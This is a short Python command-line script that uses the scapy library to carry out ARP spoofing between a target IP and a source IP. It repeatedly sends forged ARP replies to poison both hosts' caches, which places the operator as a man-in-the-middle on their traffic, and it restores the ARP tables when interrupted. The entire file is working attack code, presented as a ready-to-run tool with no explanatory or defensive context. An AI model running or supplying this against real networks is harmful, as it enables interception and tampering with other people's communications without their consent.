#!/usr/bin/env python

import scapy.all as scapy
import time
import optparse

def get_ip():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--targetip", dest="target_ip", help="[+]Enter target IP")
    parser.add_option("-s", "--sourceip", dest="source_ip", help="[+]Enter source IP")
    option = parser.parse_args()[0]
    return option

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request  # concatenate broadcast and arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

option = get_ip()
packet_send_count = 0
try:
    if not option.target_ip:
        print("[-]Enter the target IP")
        exit()
    elif not option.source_ip:
        print("[-]Enter the source IP")
        exit()
    while True:
        spoof(option.target_ip, option.source_ip)
        spoof(option.source_ip, option.target_ip)
        packet_send_count += 2
        print("\rPacket send: " + str(packet_send_count), end="")
        time.sleep(2)
except:
    if not option.target_ip:
        exit()
    elif not option.source_ip:
        exit()
    restore(option.target_ip, option.source_ip)
    restore(option.source_ip, option.target_ip)
    print("\n[+]Restoring back ARP tables...... ")
    print("[+]Please wait.....")
    time.sleep(2)
